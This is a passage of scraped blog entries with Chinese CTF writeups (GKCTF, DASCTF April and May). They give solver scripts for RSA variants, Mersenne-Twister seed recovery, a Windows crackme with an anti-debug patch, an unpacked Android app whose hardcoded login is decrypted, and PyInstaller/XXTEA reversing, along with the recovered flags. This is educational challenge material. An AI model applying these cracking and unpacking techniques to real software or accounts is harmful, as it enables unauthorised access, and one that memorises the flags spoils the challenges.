1593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513e=65537var1=pow(hint2-212121,202020,n1)var1=pow(2020,202020,n1)*var1%n1var2=pow(2021,202020,n1)*hint1%n1q1=10866506913047038137740935566742708261832434856649253065298695652571582985605691427640899414330824525161279752924895740377208318584484168722588418228539943p1=n1//q1phi1=(p1-1)*(q1-1)d1=inverse(e,phi1)p=pow(c1,d1,n1)var3=pow(hint3,212121,n2)var4=pow(hint4,202020,n2)var3=var3*pow(2021,202020*212121,n2)var4=var4*pow(2020,202020*212121,n2)q2=GCD((var3-var4)%n2,n2)p2=n2//q2phi2=(p2-1)*(q2-1)d=inverse(e,phi2)q=pow(c2,d,n2)phi=(p-1)*(q-1)d=inverse(e,phi)m=pow(c,d,p*q)print(n2s(m))# GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8}'","link":"/2022/03/12/Crypto-1/"},{"title":"DASCTF Apr Writeup","text":"学习一下不会的题 [TOC] Cryptospecial_rsa题目描述123456789101112131415161718192021222324from Crypto.Util.number import *def getPrime1(bitLength, e): while True: i = getPrime(bitLength) if (i - 1) % e ** 2 == 0: return iflag=b'DASCTF{????????????????????}'m = bytes_to_long(flag)lenth = ((len(bin(m)) - 2) // 2) + 9e=113p = getPrime1(lenth, e)q = getPrime1(lenth, e)n=p*qprint(f&quot;n = {n}&quot;)c = pow(m, e, n)for i in range(26): lenth = ((len(bin(c)) - 2) // 2) + 9 p = getPrime1(lenth, e) q = getPrime1(lenth, e) n=p*q print(f&quot;n = {n}&quot;) c=pow(c,e,n)print(f&quot;e = {e}&quot;)print(f&quot;c = {c}&quot;) 分析：首先可以看到题目中生成的n的位数较小，通过factordb.com可以将27轮的n全部分解。而问题在于getPrime1这个函数，它所生成的p和q满足 (p-1)\\%e^2\\equiv0也就是说，无法通过对 $phi$ 求逆来得到 $d$ ，需要通过求解高次同余方程来得到flag。而求解高次同余方程的主要算法为AMM算法。（可是不知道为什么在s=2的情况下，我自己写的AMM和网上找到的大部分AMM脚本都无法求得正确解）好在有sage封装好的函数，可以直接求解这个问题 还在得到方程的全部解后，问题就变成了怎么筛选合适的根，一个直观的想法就是加密时每一轮生成的密文都是小于当轮的n，由此我们可以利用上一轮的n来筛选此轮求得的c 当然，每一轮求得的满足条件的c可能不止一个，但是也不会太多，轮着试即可。 脚本：由于每轮解出来的c都不一样，而我又懒得写一轮过的脚本，就放了个从第四轮截断的脚本 12345678910111213141516171819c=83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801for i in range(4,-1,-1): print('round%d'%i) P.&lt;x&gt;=PolynomialRing(Zmod(p[i]),implementation='NTL') Q.&lt;y&gt;=PolynomialRing(Zmod(n[i]//p[i]),implementation='NTL') f=x^e-c g=y^e-c root_p=f.monic().roots() root_q=g.monic().roots() root_n=[] for pp in root_p: for qq in root_q: tmp=crt([int(pp[0]),int(qq[0])],[p[i],n[i]//p[i]]) if tmp&lt;n[i-1]: if i==0: print(n2s(int(tmp))) c=tmp print('end') 最后出来一堆乱码，在里面搜“DASCTF”即可 CVE OF RSAroca漏洞，推荐使用以下代码 crypto-attacks/roca.py at c26872bdac2e2d95c5be00e6e593c891c849f446 · jvdsn/crypto-attacks (github.com) ReverseCrackme拖进IDA，shift+f12搜索Wrong，迅速进到关键函数 可以看到password长度要求为8，flag要求长度为32，中间存在一些加密函数 有对比函数，尝试动调看对比的是啥玩意 调试不动，存在反调试机制，查了一下是ZwSetInformationThread ZwSetInformationThread - CTF Wiki (ctf-wiki.org) 字符串中搜索ZwSetInformation，定位到反调试函数，将此处的11h改为其他数字即可 继续调，在sub_1031e0处下断点，可以看到this的值为0xeff710，而根据memcmp的参数，我们可以推断出要比较的内容分别放在0xeff7ec、0xeff8f0、0xeff9f4，分别到这两个地方取出要比较的内容，分别为0x9f77c2a4ac5c0a671321bbe1e9972af6、0xd59f8e94b0e1de6e329518a0c444aa94de7c8d44、0x5b9ceeb23bb7d734f31b7514c6b21fe8de334474751b476ad4375188fc67e660da0d5827814353ea7b52856c8665afb4 再去看sub_103510里面对变量做了什么处理，可以看到是调用的库函数进行加密处理。通过这个网站CryptDeriveKey function (wincrypt.h) - Win32 apps | Microsoft Docs 可以查询到对应函数的作用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455bool __stdcall sub_103510(BYTE *pbData, DWORD dwDataLen, ALG_ID Algid, int a4, int a5){ bool result; // al _DWORD var20; // [esp+10h] [ebp-20h] _DWORD var18; // [esp+18h] [ebp-18h] BYTE var14[4]; // [esp+1Ch] [ebp-14h] DWORD pdwDataLen; // [esp+20h] [ebp-10h] HCRYPTPROV phProv; // [esp+24h] [ebp-Ch] HCRYPTHASH phHash; // [esp+28h] [ebp-8h] phProv = 0; phHash = 0; var20 = 0; *var14 = 0; pdwDataLen = 0; var18 = CryptAcquireContextA(&amp;phProv, 0, 0, 0x18u, 0xF0000000); if ( var18 ) { var18 = CryptCreateHash(phProv, Algid, 0, 0, &amp;phHash); if ( var18 ) { var18 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( var18 ) { pdwDataLen = 4; var18 = CryptGetHashParam(phHash, 4u, var14, &amp;pdwDataLen, 0); if ( var18 ) { var20 = sub_104540(*var14); if ( var20 ) { memset(var20, 0, *var14); var18 = CryptGetHashParam(phHash, 2u, var20, var14, 0); if ( var18 ) { *a4 = var20; *a5 = *var14; } } else { var18 = 0; } } } } } if ( !var18 &amp;&amp; var20 ) sub_10453B(var20); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return var18;} 分析后大概可以知道大概流程如下 通过爆破或者在线查询可以得到这些哈希值对应的原像为NocT、uRne，然后模仿加密流程写出解密代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;windows.h&gt;#include &lt;windef.h&gt;#include &lt;wincrypt.h&gt;#include &lt;stdio.h&gt;int main(void){ BOOL v6; // [esp+4h] [ebp-18h] HCRYPTKEY phKey; // [esp+Ch] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+10h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+14h] [ebp-8h] BYREF phProv = 0; phHash = 0; phKey = 0; BYTE key[] = { 0x5c, 0x53, 0xa4, 0xa4, 0x1d, 0x52, 0x43, 0x7a, 0x9f, 0xa1, 0xe9, 0xc2, 0x6c, 0xa5, 0x90, 0x90 }; BYTE input[] = { 0x5B, 0x9C, 0xEE, 0xB2, 0x3B, 0xB7, 0xD7, 0x34, 0xF3, 0x1B, 0x75, 0x14, 0xC6, 0xB2, 0x1F, 0xE8, 0xDE, 0x33, 0x44, 0x74, 0x75, 0x1B, 0x47, 0x6A, 0xD4, 0x37, 0x51, 0x88, 0xFC, 0x67, 0xE6, 0x60, 0xDA, 0x0D, 0x58, 0x07, 0x81, 0x43, 0x53, 0xEA, 0x7B, 0x52, 0x85, 0x6C, 0x86, 0x65, 0xAF, 0xB4 }; DWORD keyLen = 0x10; DWORD inputLen = 0x20; DWORD * t = &amp;inputLen; v6 = CryptAcquireContextA(&amp;phProv, 0, 0, 0x18u, 0xF0000000); if (v6) { v6 = CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash); if (v6) { v6 = CryptHashData(phHash, key, keyLen, 0); if (v6) { v6 = CryptDeriveKey(phProv, 0x660Eu, phHash, 1u, &amp;phKey); if (v6) v6 = CryptDecrypt(phKey, 0, 1, 0, input, t); printf(&quot;%s&quot;, input); } } } if (phKey) CryptDestroyKey(phKey); if (phHash) CryptDestroyHash(phHash); if (phProv) CryptReleaseContext(phProv, 0); return 0;} 最后附加一个c++逆向 [系统安全20]动态调试技巧-C++代码逆向 - 17bdw - 博客园 (cnblogs.com) FakePica用jadx打开的时候遇到了代码重构失败的问题，推测是加了壳，上网搜wp开始抄 可以使用这个工具进行脱壳CodingGay/BlackDex: BlackDex is an Android unpack(dexdump) tool, it supports Android 5.0~12 and need not rely to any environment. BlackDex can run on any Android mobile phone or emulator, you can unpack APK File in several seconds. (github.com) 提取出脱壳文件，在拖进jadx中，进到MainActivity，大概逻辑就是对邮箱和密码进行AES/CBC加密，然后与content0和content1进行对比 然后写脚本可以得到解密后的邮箱和密码 1234567891011121314151617181920from Crypto.Cipher import AESfrom Crypto.Util.number import bytes_to_long,long_to_bytescontent0 = [-114, 95, -37, 127, -110, 113, 41, 74, 40, 73, 19, 124, -57, -88, 39, -116, -16, -75, -3, -45, -73, -6, -104, -6, -78, 121, 110, 74, -90, -47, -28, -28]content1 = [-40, 26, 95, -49, -40, -123, 72, -90, -100, -41, 122, -4, 25, -101, -58, 116]c0=b''for i in content0: c0+=long_to_bytes(i%256)c1=b''for i in content1: c1+=long_to_bytes(i%256)key=b'picapicapicapica'iv=b'0102030405060708'aes=AES.new(key,AES.MODE_CBC,iv)de_text_1=aes.decrypt(c0)print(de_text_1)aes2=AES.new(key,AES.MODE_CBC,iv)de_text_2=aes2.decrypt(c1)print(de_text_2)# picacomic@gmail.com# picacomic 最后登录进去即可getflag 奇怪的交易查到有upx壳，脱掉 拖进IDA，发现是python逆向，用pyinstxtractor+python反编译 - 在线工具 (tool.lu)尝试搞出源代码，发现大部分恢复失败 1objcopy --dump-section pydata=pydata.dump DAS 1python3 pyinstxtractor.py pydata.dump 翻译字节码dis模块得到字节码 1234567import marshalimport disf=open('aaa.pyc','rb')data=f.read()Pycode=data[16:]Pyobj=marshal.loads(Pycode)dis.dis(Pyobj) 大概翻译了一下： 12345678910111213141516171819202122from cup import *import libnumflag=input('请输入flag')pubkey=[12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893,12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435]m=libnum.s2n(flag)c=str(pow(m,pubkey[1],pubkey[0]))strange1=[]strange2=[3532577106, 1472742623, 3642468664, 4193500461, 2398676029, 617653972, 1474514999, 1471783658, 1012864704, 3615627536, 993855884, 438456717, 3358938551, 3906991208, 198959101, 3317190635, 3656923078, 613157871, 2398768861, 97286225, 2336972940, 1471645170, 3233163154, 583597118, 2863776301, 3183067750, 1384330715, 2929694742, 3522431804, 2181488067, 3303062236, 3825712422, 145643141, 2148976293, 2940910035, 506798154, 994590281, 2231904779, 3389770074, 2814269052, 1105937096, 1789727804, 3757028753, 2469686072, 1162286478, 680814033, 2934024098, 2162521262, 4048876895, 2121620700, 4240287315, 2391811140, 3396611602, 3091349617, 3031523010, 2486958601, 3164065171, 1285603712, 798920280, 2337813135, 4186055520, 3523024366, 1077514121, 1436444106, 2731983230, 1507202797, 500756149, 198754565, 2382448647, 880454148, 1970517398, 3217485349, 1161840191, 560498076, 1782600856, 2643721918, 1285196205, 788797746, 1195724574, 4061612551, 103427523, 2502688387, 4147162188, 617564657, 978211984, 1781482121, 2205798970, 3939973102, 3826603515, 659557668, 2582884932, 1561884856, 2217488804, 1189296962, 169145316, 2781742156, 1323893433, 824667876, 408202876, 3759637634, 4094868412, 1508996065, 162419237, 3732146944, 3083560189, 3955940127, 2393776934, 2470191468, 3620861513, 481927014, 2756226070, 3154651143, 1261069441, 2063238535, 2222237213, 101459755, 3159774417, 1721190841, 1078395785, 176506553, 3552913423, 1566142515, 1938949000, 1499289517, 3315102456, 829714860, 3843359394, 952932374, 1283577465, 2045007203, 3957761944, 3767891405, 2917089623, 3296133521, 482297421, 1734231412, 3670478932, 2575334979, 2827842737, 3413631016, 1533519803, 4008428470, 3890643173, 272960248, 317508587, 3299937500, 2440520601, 27470488, 1666674386, 1737927609, 750987808, 2385923471, 2694339191, 562925334, 2206035395]i=0while i&lt;len(c): strange3=0 for ii in c[i:i+4]: strange3=(strange3&lt;&lt;8)+ord(ii) strange1.append(strange3) i=i+4i&lt;len(c)strange4=[54,54,54,54]ᘠ=len(strange4)res=encrypt(ᘠ,strange1,strange4)if strange1==strange2: print('You are right!') 大致流程就是先进行一个RSA加密，然后是一个encrypt函数，这里的encrypt猜测从cup中import过来，因此下面需要对打包好的pyz进行逆向 pyinstaller加密这里实际上用了一个pyinstaller加密 解包pyz文件（注意这里需要在python3.10环境下才能解包成功） 然后注意从可执行文件解包回来的文件中，含有下面这个文件，其中含有加密的密钥，对其进行反编译可以得到 然后通过脚本对cup.pyc.encrypted进行解密，得到cup.pyc文件 123456789101112131415161718192021222324252627import tinyaesimport zlib CRYPT_BLOCK_SIZE = 16 # 从crypt_key.pyc获取key，也可自行反编译获取key = bytes('0000000000000tea', 'utf-8') inf = open('cup.pyc.encrypted', 'rb') # 打开加密文件outf = open('cup.pyc', 'wb') # 输出文件 # 按加密块大小进行读取iv = inf.read(CRYPT_BLOCK_SIZE) cipher = tinyaes.AES(key, iv) # 解密plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))# 补pyc头(最后自己补也行)outf.write(b'\\x6f\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0')# 写入解密数据outf.write(plaintext) inf.close()outf.close() 最后看字节码可以分析出XXTEA加密（累 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value&gt;&gt;5 ^ y.value&lt;&lt;2) + (y.value&gt;&gt;3 ^ z.value&lt;&lt;4) temp2 = (total.value ^ y.value) + (key[(p&amp;3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): delta = 0x9e3779b9 rounds = 6 + 52//n total = c_uint32(0) z = c_uint32(v[n-1]) e = c_uint32(0) while rounds &gt; 0: total.value += delta e.value = (total.value &gt;&gt; 2) &amp; 3 for p in range(n-1): y = c_uint32(v[p+1]) v[p] = c_uint32(v[p] + MX(z,y,total,key,p,e).value).value z.value = v[p] y = c_uint32(v[0]) v[n-1] = c_uint32(v[n-1] + MX(z,y,total,key,n-1,e).value).value z.value = v[n-1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x9E3779B9 rounds = 6 + 52//n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds &gt; 0: e.value = (total.value &gt;&gt; 2) &amp; 3 for p in range(n-1, 0, -1): z = c_uint32(v[p-1]) v[p] = c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value y.value = v[p] z = c_uint32(v[n-1]) v[0] = c_uint32(v[0] - MX(z,y,total,key,0,e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v # test if __name__ == &quot;__main__&quot;: # 该算法中每次可加密不只64bit的数据，并且加密的轮数由加密数据长度决定 k = [54, 54, 54, 54] n = 155 res=[3532577106, 1472742623, 3642468664, 4193500461, 2398676029, 617653972, 1474514999, 1471783658, 1012864704, 3615627536, 993855884, 438456717, 3358938551, 3906991208, 198959101, 3317190635, 3656923078, 613157871, 2398768861, 97286225, 2336972940, 1471645170, 3233163154, 583597118, 2863776301, 3183067750, 1384330715, 2929694742, 3522431804, 2181488067, 3303062236, 3825712422, 145643141, 2148976293, 2940910035, 506798154, 994590281, 2231904779, 3389770074, 2814269052, 1105937096, 1789727804, 3757028753, 2469686072, 1162286478, 680814033, 2934024098, 2162521262, 4048876895, 2121620700, 4240287315, 2391811140, 3396611602, 3091349617, 3031523010, 2486958601, 3164065171, 1285603712, 798920280, 2337813135, 4186055520, 3523024366, 1077514121, 1436444106, 2731983230, 1507202797, 500756149, 198754565, 2382448647, 880454148, 1970517398, 3217485349, 1161840191, 560498076, 1782600856, 2643721918, 1285196205, 788797746, 1195724574, 4061612551, 103427523, 2502688387, 4147162188, 617564657, 978211984, 1781482121, 2205798970, 3939973102, 3826603515, 659557668, 2582884932, 1561884856, 2217488804, 1189296962, 169145316, 2781742156, 1323893433, 824667876, 408202876, 3759637634, 4094868412, 1508996065, 162419237, 3732146944, 3083560189, 3955940127, 2393776934, 2470191468, 3620861513, 481927014, 2756226070, 3154651143, 1261069441, 2063238535, 2222237213, 101459755, 3159774417, 1721190841, 1078395785, 176506553, 3552913423, 1566142515, 1938949000, 1499289517, 3315102456, 829714860, 3843359394, 952932374, 1283577465, 2045007203, 3957761944, 3767891405, 2917089623, 3296133521, 482297421, 1734231412, 3670478932, 2575334979, 2827842737, 3413631016, 1533519803, 4008428470, 3890643173, 272960248, 317508587, 3299937500, 2440520601, 27470488, 1666674386, 1737927609, 750987808, 2385923471, 2694339191, 562925334, 2206035395] res = decrypt(n, res, k) # print(res) for i in res: print(chr(i&gt;&gt;24),end=&quot;&quot;) print(chr((i&amp;0x00ff0000)&gt;&gt;16),end=&quot;&quot;) print(chr((i&amp;0x0000ff00)&gt;&gt;8),end=&quot;&quot;) print(chr(i&amp;0x000000ff),end=&quot;&quot;) #c= 10610336534759505889607399322387179316771488492347274741918862678692508953185876570981227584004676580623553664818853686933004290078153620168054665086468417541382824708104480882577200529822968531743002301934310349005341104696887943182074473298650903541494918266823037984054778903666406545980557074219162536057146090758158128189406073809226361445046225524917089434897957301396534515964547462425719205819342172669899546965221084098690893672595962129879041507903210851706793788311452973769358455761907303633956322972510500253009083922781934406731633755418753858930476576720874219359466503538931371444470303193503733920039 最后通过RSA的维纳攻击即可恢复出flag 参考 DASCTF-FATE-Reverse | Hexo (gift1a.github.io) Re]2022DASCTF Apr X FATE 防疫挑战赛_批某人的博客-CSDN博客 DASCTF 2022 - 云之君 (yunzh1jun.com) https://ppppz.net/ _(:3」」还是被发现了 (t0hka.top) [原创]Python逆向——Pyinstaller逆向-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com","link":"/2022/05/05/DASCTF-Apr-Writeup/"},{"title":"DASCTF MAY","text":"[TOC] CryptoYusa的密码学课堂—一见如故Description12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Myrand(): def __init__(self,seed): self.index = 0 self.isInit = 1 self.MT = [seed] + [0] * 623 for i in range(1,624): t = 1314433253 * (self.MT[i-1] ^ (self.MT[i-1] &gt;&gt; 30)) + 1 self.MT[i] = t &amp; 0xffffffff def generate(self): for i in range(624): y = (self.MT[i] &amp; 0x80000000) + (self.MT[(i+1)%624] &amp; 0x7fffffff) self.MT[i] = self.MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: self.MT[i] ^= 2567483520 def rand(self): if self.index == 0: self.generate() y = self.MT[self.index] y = y ^ self.cs2l(y, 11) ^ self.cs2l(y,15) y = y ^ self.cs2r(y,7) ^ self.cs2r(y,19) self.index = (self.index + 1) % 624 return y def cs2l(self, y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(self, y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffimport osr = Myrand(int(os.urandom(4).hex(),16))out = []for i in range(624): out.append(r.rand())with open(&quot;output.txt&quot;,&quot;w&quot;) as f: f.write(str(out))from hashlib import md5flag = 'DASCTF{' + md5(str(r.rand()).encode()).hexdigest() + '}'print(flag) 关键在于rand() y=MT[INDEX]\\\\ y=y\\oplus(y19)线性代数啥的不太懂，但试了一下可以发现 $Random$ 再经过随机数算法七次后即可还原回 $MT[INDEX]$ 既然能还原回 $MT[INDEX]$ ，那一切都好办了，再generate一次，运行一遍随机数生成算法即可 （较为正规的解法可以参考官方wp） solve123456789101112131415161718192021222324252627282930313233343536from hashlib import md5output=[3417500333, 4091726338, 652603332, 4187304543, 4293795290, 1622245003, 3383443782, 2420250331, 322010852, 1604005753, 3137930218, 1074571824, 1566336258, 2754341076, 1059426660, 2461569360, 613134153, 860561774, 3003069274, 553387944, 1949778231, 249886857, 2322866121, 3685855175, 1977923546, 1887238269, 253812990, 2188417674, 2718707711, 1599975569, 3254935456, 3199641169, 362166522, 1378687155, 912036995, 3174049018, 780042016, 970421905, 3468971406, 801660807, 833926127, 473587885, 158979812, 405306558, 1363084996, 2023076543, 2069797730, 718155249, 1641186127, 3616747747, 1575693921, 3856591855, 223881884, 3002184567, 1666647440, 617661934, 2673101022, 885332395, 3391329168, 1640225363, 2565685644, 3892963352, 3034627488, 2415435183, 3648712566, 2140877952, 1303506086, 2455662362, 1720382700, 3970268445, 2579167586, 4117229324, 846645263, 3252991293, 79067029, 2756800392, 2212447526, 2203329967, 1270408703, 740176928, 3176125705, 166800854, 3327343902, 2079714725, 3702269956, 3659849279, 3658666909, 797535816, 600857570, 553836307, 2394740468, 1178393549, 2183765310, 4014432190, 652246726, 3693235932, 4046942361, 4105444828, 145386213, 1198390220, 3023119098, 663559283, 225958361, 3893000878, 1615631644, 1941951859, 471085675, 2164362049, 4274234562, 4127314557, 1833529303, 17668093, 3208743142, 3210135945, 1772990736, 3290157875, 3006334453, 3831748800, 1120411838, 690279329, 2436940844, 1440602808, 1552272917, 1321728089, 524486126, 3696307959, 1189129368, 28736041, 3143264315, 3050323849, 1458456612, 389869312, 2360130428, 854837117, 1270423403, 3471650414, 243573262, 3449929772, 2436299611, 420972940, 923873821, 3499748829, 2470333529, 3901870125, 3589884387, 3339475693, 1526947412, 1747516667, 2971536797, 273910310, 2185887289, 2723697010, 1973585459, 1166325256, 1360822059, 416514510, 4038763765, 1816380840, 940152644, 3918708431, 3410593321, 3358844522, 3678637784, 2412834780, 3052967117, 3672611162, 570069042, 95771608, 1210821251, 2163778365, 2739972546, 3094346015, 749719666, 1697477587, 986142486, 2591897292, 1234948693, 3659791160, 3990257960, 501199958, 3029961497, 578415668, 124517322, 1985205894, 3777347400, 1149995545, 290699775, 3399696193, 1062094395, 2896523484, 1562688856, 992098141, 3941170280, 262596967, 2585751001, 3682611205, 530523926, 1202322766, 3777439514, 3051700271, 261632458, 2736123960, 2786338595, 86310784, 2760191516, 1344514731, 350767781, 2858876127, 519088864, 3193340756, 3563489312, 3239917298, 161418824, 470724403, 3310407387, 1743713887, 3064036770, 1175434157, 3029464330, 116086349, 1652489862, 1176236897, 4139800383, 3758499033, 2961626313, 3064683859, 958478146, 596650527, 1000277312, 4102368994, 1480011430, 4001401502, 4004287177, 3202905309, 1754655955, 2064262245, 1840530874, 2284428117, 2281854453, 1023839768, 2166517711, 2709857675, 2005014414, 4161461001, 2932436148, 2411599350, 4267437788, 2132764972, 150665266, 286170947, 2249288787, 3953585886, 1231725143, 2479045931, 2377059462, 281316188, 379113422, 920019004, 163289886, 2210874762, 1578529538, 309521495, 3737017316, 88919917, 559742618, 978230553, 2154491496, 994913727, 498894258, 1355546448, 4023836881, 3014313787, 164044564, 2408825840, 2029992558, 3707778216, 86206872, 3576935874, 185356787, 1774175910, 3145237900, 3497547609, 841914878, 3425254534, 4264030778, 2348022032, 178331591, 943923822, 3384367749, 2806712599, 1178535099, 1251085540, 2410015803, 1480595408, 2732607876, 1579706357, 870791724, 2320512780, 2149666862, 3797999384, 3905363134, 3388169321, 851973359, 1418716205, 207581030, 1740441523, 1173839013, 4280610104, 1769134281, 1758916333, 4061069248, 2147554262, 2749007447, 909878569, 2054562584, 1515003000, 560286390, 2482663802, 2690882951, 3298162668, 2561737261, 167825221, 507375343, 2179952491, 795452860, 2877704207, 3243106071, 1633372043, 2152178033, 2993246714, 4176238981, 3828458887, 695369535, 2514762808, 2251430819, 2743651063, 783239046, 4036497041, 2175424426, 765021321, 897227922, 3192938155, 4173350810, 2290496185, 4215986056, 2448481441, 3114984799, 2920066349, 722868808, 594363801, 4012575088, 454547939, 3331771662, 1267229957, 3170277692, 2446344734, 3730529788, 2621611481, 2972284304, 2580290241, 486727007, 2727955445, 1457071884, 1053028185, 462301682, 3907840756, 1832398102, 3144685297, 3403964915, 4263570498, 792776003, 306771255, 1633688240, 2159479271, 942060576, 1311531808, 3145754189, 4142271069, 2844524541, 4082439147, 2847276716, 1374436698, 2601522390, 529644524, 206090172, 3015114937, 4137169373, 2600331537, 344659140, 155319271, 1724932164, 3187877676, 4020168431, 711431575, 4123955169, 2539963709, 2764832709, 3897838285, 2521203644, 2059212822, 1129046005, 3277260664, 2739869189, 1955591901, 2661672178, 2926355273, 28176978, 706409211, 1432061304, 26517996, 3180196905, 2178525849, 607854674, 3953350517, 3532394548, 4175940932, 626671309, 1273934270, 3481828801, 22643989, 2104739013, 4183577772, 3932721637, 3075788222, 2814353001, 4120869721, 2045506903, 603494333, 335162960, 2069261279, 2278614835, 210140447, 2012566692, 2345710126, 70390387, 457247932, 2764651800, 652766919, 555253440, 864036913, 1720142260, 453262569, 1113437101, 2576419688, 144008475, 1786881829, 2455128823, 2884922345, 4251332234, 58949785, 4206002785, 3374754553, 2976162198, 546450687, 1268444784, 4132330381, 3404894280, 2421962142, 212361299, 2526283704, 1656118437, 1249336298, 305885855, 1090758249, 3752057640, 3508190692, 3637428, 105102422, 2247418237, 1873609555, 1206760240, 3761689119, 3151616638, 1711308858, 1261541178, 1843103377, 3158893523, 1226253110, 3337577909, 126612372, 2239219657, 1415387229, 3657507305, 3330696118, 2304219467, 3782535397, 2523926865, 173770442, 469421316, 4068724979, 567442650, 1996215573, 2071307093, 778899724, 3534102235, 1001138889, 2821812427, 591691317, 1265763678, 2241915660, 3220601768, 653090205, 2367897867, 1393909319, 2691817329, 3098049768, 117121403, 1255294678, 2272844919, 788255921, 2333869622, 4052660679, 2407095869, 2636108242, 2204717619, 1672726444, 2250826426, 258706466, 2295454699, 337308034, 3703973770, 3133498524, 22718827, 3096937679, 2039003308, 1519854757, 568184976, 1986854118, 2888207511, 822307630, 3829301724, 3198527490, 3073739663, 3043580445, 3458239370, 802145890, 376901460, 1251103099, 1143003993, 1280321148, 661386076, 3708710489, 2237151715, 3928104641, 2975550516, 1087492088, 1504028830, 61927086, 3858242888, 1916136658, 2328550074, 3032032377, 2193802260, 3311627503, 3196945045, 3396801792, 806210594, 2449941623, 2514744466, 3922130206, 3245757763, 3128328446, 2335833206, 3205660364, 3527402441, 2174241644, 1262568556, 2360103007, 2490217737, 1485100950, 3407260, 3005226942, 1355314866, 3154763465, 619881867, 2409963438, 2422269402, 205756019, 3300644241, 1157501775, 1229058028, 161050869, 969496287, 3385825249, 2557284067, 4236642714, 169094727, 2698326774, 1863176242, 3532885426, 3046403588, 3869207867, 496104150, 353604631, 1054882225, 152711981, 1362131890, 76912113, 3052177189, 3932252092, 3834713905, 2338378436, 44417325, 117723195, 1089433566, 4166617161, 2848021308, 2229619096, 319957702, 3661655667, 2809620731, 482011930, 3983483016, 82362287, 1518135562, 3490996143, 510129461, 1400609584, 2646113779, 732457215, 3735585198, 3451194227, 959269510, 244188667]print(len(output))def cs2l( y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffff# Recover MTMT=[]for i in range(623,-1,-1): t=output[i] for i1 in range(7): t=t^cs2r(t,7) ^cs2r(t,19) for i2 in range(7): t=(t^cs2l(t,11)^cs2l(t,15)) MT.append(t)MT=MT[::-1]# get the next random numberdef generate(): for i in range(624): y = (MT[i] &amp; 0x80000000) + (MT[(i+1)%624] &amp; 0x7fffffff) MT[i] = MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: MT[i] ^= 2567483520generate()y = MT[0]y = y ^ cs2l(y, 11) ^ cs2l(y,15) y = y ^ cs2r(y,7) ^ cs2r(y,19) print(y)flag = 'DASCTF{' + md5(str(y).encode()).hexdigest() + '}'print(flag) Yusa的密码学课堂——二眼深情Description随机数生成算法与Crypto 1一样，不同之处在于要求仅能查询两次随机数的情况下，还原随机数的种子 Analyse我们要还原出seed，而seed一开始放在init_MT[0]中，而由init算法我们可以知道init_MT[0]生成了init_MT[1]，也就是说知道了init_MT[1]可以在还原init_MT[0] 而从init算法我们可以知道的另一个重要信息是，只要我知道一个init_MT[i]的具体数值，就可以还原出init_MT[j](i&lt;j&lt;624)的信息，甚至是还原整个init_MT（这点未尝试，但感觉可以） 从上面的分析可以知道，我们只要知道任意一个init_MT[i]的信息，即可还原回seed。 接下来的重点在于分析generate()算法，我们的关注点落在了这行代码上 对于i=227的generate_MT[i]，其在生成过程中与generate_MT[(i+397)%624]异或。而除了i=623之外，y中始终是包含着init_MT[i+1]的信息的。 仔细分析过后，我们可以得到如下的策略： 查询$RANDOM[i]\\ RANDOM[j],\\ i\\geq 227\\ j=i+397\\ mod\\ 624$ 通过第一题的还原算法得到 $generate_MT[i], generate_MT[j]$ 通过等式 $generate_MT[i]=generate_MT[j]\\oplus (y&gt;&gt;1)$ 来还原$y$ 然后由$y$ 还原$init_MT[i+1]$ 最后由$init_MT[i+1]$ 还原$seed$ 这其中由于丢失了一些信息以及为了推导顺利做的假设，如假设$y\\&amp;1=0$，使得最终的还原存在一定的概率，不过每秒爆个几百万次的暴力算法啥的咱都见怪不怪了，这个也就爆个十来次挺不错了。 Solve由于概率问题，需要试个大概十几次才能爆出flag，或许还有更优化的解决方法，但我太懒了，就这样好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import osimport gmpy2# check 227 AND 0see_227=3777403325see_0_ed=4069692166# secret=1085569210def cs2l( y, shift): return ((y &lt;&lt; shift) ^ (y 